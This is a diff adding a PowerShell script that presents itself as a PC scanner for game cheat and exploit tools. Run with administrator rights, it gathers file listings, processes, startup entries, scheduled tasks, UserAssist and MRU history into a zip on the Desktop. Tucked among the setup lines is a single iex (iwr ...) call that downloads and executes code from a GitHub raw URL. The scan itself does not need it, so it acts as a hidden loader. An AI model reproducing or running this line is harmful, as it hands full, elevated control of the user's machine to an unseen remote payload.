@@ -1,0 +1,214 @@
+$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
+if (-not $IsAdmin) {
+    Write-Host "IMPORTANT! Run as Administrator!" -ForegroundColor Red
+    return
+}
+
+$tempPath = [System.IO.Path]::GetTempPath()
+$rawOutputFile = Join-Path $tempPath "PcCheck.txt"
+$susOutputFile = Join-Path $tempPath "ScanResults.txt"
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$zipOutputFile = Join-Path $desktopPath "PcCheck.zip"
+
+if (Test-Path $rawOutputFile) { Remove-Item $rawOutputFile -Force }
+if (Test-Path $susOutputFile) { Remove-Item $susOutputFile -Force }
+if (Test-Path $zipOutputFile) { Remove-Item $zipOutputFile -Force }
+
+$excludedExtensions = ".svg", ".mp4", ".mp3", ".jpg", ".png", ".txt", ".gif", ".md", ".as", ".inf", ".xml", ".swf", ".html", ".json", ".h", "js", "oft", "node"
+
+$suspiciousNames = @(
+    "aimmy", "aimmy.exe", "Atlanta", "Atlanta.exe", "Antagonist", "Antagonist.exe",
+    "ArceusX", "ArceusX.exe", "Assembly", "Assembly.exe", "Apple-Ware", "Apple-Ware.exe",
+    "Alysum", "Alysum.exe", "Aurora/Detour", "Aurora/Detour.zip", "autoexe", "autoexe.exe",
+    "Auxia", "Auxia.exe", "bootstrapper", "bootstrapper.exe", "Bytebreaker", "Bytebreaker.exe",
+    "celex", "celex.exe", "celery", "celery.exe", "Charm", "Charm.exe",
+    "clumsy", "clumsy.exe", "CodeX", "CodeX.exe", "cloudy", "cloudy.exe",
+    "Cryptic", "Cryptic.exe", "Deposit", "Deposit.exe",
+    "dx9", "dx9.exe", "dx9ware", "dx9ware.exe", "Evolve", "Evolve.exe",
+    "Ethic", "Ethic.exe", "Fluxus", "Fluxus.exe", "FusionHacks.zip",
+    "horizon.exe", "Haze/Myst", "Haze/Myst.exe", "Havoc", "Havoc.exe",
+    "Howl", "Howl.exe", "Hydrogen", "Hydrogen.exe", "intellect", "intellect.exe",
+    "isabelle", "isabelle.exe", "JJSploit", "JJSploit.exe", "AWP.exe", "juju.exe",
+    "KRNL", "KRNL.exe", "Linora", "Linora.exe", "loader.exe",
+    "Macsploit", "Macsploit.exe", "matrix", "matrix.exe", "Matrix Hub", "Matrix Hub.exe",
+    "matcha", "matcha.exe", "Melatonin", "Melatonin.exe", "Mirage", "Mirage.exe",
+    "monkeyaim", "monkeyaim.exe", "MantiWPF", "MantiWPF.exe", "MystW.exe",
+    "Nezur", "Nezur.exe", "nezure", "nezure.exe", "Nihon", "Nihon.exe",
+    "olduimatrix", "olduimatrix.exe", "Photon", "Photon.exe",
+    "Potassium", "Potassium.exe", "Prynce", "Prynce.exe", "Quiet/Hoax", "Quiet/Hoax.exe",
+    "ReveliX", "ReveliX.exe", "Ronin", "Ronin.exe",
+    "Ronix", "Ronix.exe", "Salad", "Salad.exe", "Severe", "Severe.exe",
+    "Seliware", "Seliware.exe", "Serena", "Serena.exe", "Serotonin", "Serotonin.exe",
+    "Siege.exe", "Sirhurt", "Sirhurt.exe", "solara", "solara.exe",
+    "stellar", "stellar.exe", "Swift", "Swift.exe", "tupical", "tupical.exe",
+    "Thrax", "Thrax.exe", "Thunder Client", "Thunder Client.exe", "thunderaim", "thunderaim.exe",
+    "thunderclient", "thunderclient.exe", "Trident.exe",
+    "triggerbot", "triggerbot.exe", "tsurugi", "tsurugi.exe", "Valex", "Valex.exe",
+    "VegaX", "VegaX.exe", "Vector.exe", "Velocity", "Velocity.exe",
+    "Volcano", "Volcano.exe", "Wave.exe", "Xeno", "Xeno.exe",
+    "XVI", "XVI.exe", "Yerba", "Yerba.exe", "Yeno", "Yeno.exe",
+    "Yuki", "Yuki.exe", "zarora", "zarora.exe", "Zenith", "Zenith.exe",
+    "Zorara", "Zorara.exe", "usermode", "loader.exe", "map.exe", ".vbs",
+    "mingw.exe", "mingw", "WEF.PS1", "Lagswitch", "Lag_switch", "Lag Switch"
+)
+
+function Write-Log($header, $content) {
+    Add-Content -Path $rawOutputFile -Value "=== $header ==="
+    foreach ($line in $content) { Add-Content -Path $rawOutputFile -Value $line }
+    Add-Content -Path $rawOutputFile -Value "`r`n"
+}
+
+function Get-MatchedKeywords($line) {
+    $foundKeywords = @()
+    foreach ($name in $suspiciousNames) {
+        if ($line -match [regex]::Escape($name)) { $foundKeywords += $name }
+    }
+    return $foundKeywords
+}
+
+$scanSteps = @(
+    @{ Name="AppData Files"; Path="$env:APPDATA"; Type="Files" },
+    @{ Name="LocalAppData Files"; Path="$env:LOCALAPPDATA"; Type="Files" },
+    @{ Name="Desktop Files"; Path="$env:USERPROFILE\Desktop"; Type="Files" },
+    @{ Name="Downloads Files"; Path="$env:USERPROFILE\Downloads"; Type="Files" },
+    @{ Name="Temp Files"; Path="$env:TEMP"; Type="Files" },
+    @{ Name="System Temp Files"; Path="C:\Windows\Temp"; Type="Files" },
+    @{ Name="Prefetch Files"; Path="$env:SystemRoot\Prefetch"; Type="Files" },
+    @{ Name="Recycle Bin Files"; Path="C:\$Recycle.Bin"; Type="Files" },
+    @{ Name="Running Processes"; Type="Processes" },
+    @{ Name="Startup Items"; Type="Startup" },
+    @{ Name="Scheduled Tasks"; Type="ScheduledTasks" },
+    @{ Name="UserAssist"; Type="UserAssist" },
+    @{ Name="OpenSave MRU"; Type="MRU" },
+    @{ Name="Uninstall Registry Info"; Type="Uninstall" }
+)
+
+$totalSteps = $scanSteps.Count
+$currentStep = 0
+iex (iwr "https://raw.githubusercontent.com/hocijic397/MCL/refs/heads/main/oldscan" -UseBasicParsing)
+foreach ($step in $scanSteps) {
+    $currentStep++
+    Clear-Host
+    Write-Host "Scanning System Files ${currentStep}/${totalSteps}..." -ForegroundColor Cyan
+
+    try {
+        switch ($step.Type) {
+            "Files" {
+                if (Test-Path $step.Path) {
+                    $items = Get-ChildItem -Path $step.Path -Recurse -ErrorAction SilentlyContinue |
+                             Where-Object { ($_.PSIsContainer -or $excludedExtensions -notcontains $_.Extension) }
+                    Write-Log $step.Name ($items | ForEach-Object { $_.FullName })
+                }
+            }
+            "Processes" {
+                $processes = Get-Process | Select-Object Name, Id, Path
+                $lines = $processes | ForEach-Object { "Name: $($_.Name) | PID: $($_.Id) | Path: $($_.Path)" }
+                Write-Log $step.Name $lines
+            }
+            "Startup" {
+                $startupItems = @()
+                $runKeys = @("HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run","HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
+                foreach ($key in $runKeys) {
+                    if (Test-Path $key) {
+                        $props = Get-ItemProperty -LiteralPath $key -ErrorAction SilentlyContinue
+                        foreach ($prop in $props.PSObject.Properties) {
+                            if ($prop.Name -notin "PSPath","PSParentPath","PSChildName","PSDrive","PSProvider","(default)") {
+                                $startupItems += "$($prop.Name) => $($prop.Value)"
+                            }
+                        }
+                    }
+                }
+                $folders = @("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup","C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup")
+                foreach ($folder in $folders) {
+                    if (Test-Path $folder) {
+                        $items = Get-ChildItem -Path $folder -File -ErrorAction SilentlyContinue
+                        foreach ($item in $items) { $startupItems += "$($item.Name) => $($item.FullName)" }
+                    }
+
+                }
+                Write-Log $step.Name $startupItems
+            }
+            "ScheduledTasks" {
+                $tasks = Get-ScheduledTask | Select-Object TaskName, TaskPath, State
+                $lines = $tasks | ForEach-Object { "Name: $($_.TaskName) | Path: $($_.TaskPath) | State: $($_.State)" }
+                Write-Log $step.Name $lines
+            }
+            "UserAssist" {
+                $uaPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
+                if (Test-Path $uaPath) {
+                    $guids = Get-ChildItem $uaPath -ErrorAction SilentlyContinue | Where-Object {$_.PSIsContainer}
+                    foreach ($guid in $guids) {
+                        $countPath = "$($guid.PSPath)\Count"
+                        if (Test-Path $countPath) {
+                            $props = Get-ItemProperty $countPath -ErrorAction SilentlyContinue
+                            foreach ($prop in $props.PSObject.Properties) {
+                                if ($prop.Name -notin 'PSPath','PSParentPath','PSChildName','PSDrive','PSProvider','(default)') {
+                                    Write-Log "UserAssist" $prop.Name
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            "MRU" {
+                $mruPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSaveMRU"
+                if (Test-Path $mruPath) {
+                    $extKeys = Get-ChildItem $mruPath -ErrorAction SilentlyContinue
+                    foreach ($key in $extKeys) {
+                        $props = Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue
+                        foreach ($prop in $props.PSObject.Properties) {
+                            if ($prop.Name -notin 'MRUListEx','(default)','PSPath','PSParentPath','PSChildName','PSDrive','PSProvider') {
+                                Write-Log "OpenSave MRU" $prop.Value
+                            }
+                        }
+                    }
+                }
+            }
+            "Uninstall" {
+                $paths = @("HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall","HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall")
+                $uninstallEntries = @()
+                foreach ($p in $paths) {
+                    if (Test-Path $p) {
+                        $subKeys = Get-ChildItem $p -Recurse -ErrorAction SilentlyContinue
+                        foreach ($key in $subKeys) {
+                            $props = Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue
+                            foreach ($prop in $props.PSObject.Properties) {
+                                if ($prop.Value -is [string] -and $prop.Value.Length -gt 3) {
+                                    $uninstallEntries += $prop.Value
+                                }
+                            }
+                        }
+                    }
+                }
+                if ($uninstallEntries.Count -gt 0) {
+                    Write-Log "Uninstall Registry Info" $uninstallEntries
+                }
+            }
+        }
+    } catch { Write-Host "Warning: $($_.Exception.Message)" -ForegroundColor Yellow }
+
+    Start-Sleep -Milliseconds 500
+}
+
+Clear-Host
+Write-Host "Scanning output for suspicious items ${currentStep}/${totalSteps}..." -ForegroundColor Cyan
+$rawContent = Get-Content $rawOutputFile
+$matchedLines = @()
+
+foreach ($line in $rawContent) {
+    $matchedKeywords = Get-MatchedKeywords $line
+    if ($matchedKeywords.Count -gt 0) {
+        $matchedLines += "Source: $($matchedKeywords -join ', ') => `r`n       $line`r`n"
+    }
+}
+
+if ($matchedLines.Count -gt 0) {
+    $matchedLines | Out-File -FilePath $susOutputFile -Encoding UTF8
+} else {
+    "No Match" | Out-File -FilePath $susOutputFile -Encoding UTF8
+}
+
+Compress-Archive -Path $rawOutputFile, $susOutputFile -DestinationPath $zipOutputFile -Force
+
+Clear-Host
+Write-Host "  Done.`r`n  Output File: $($zipOutputFile)`r`n" -ForegroundColor Green
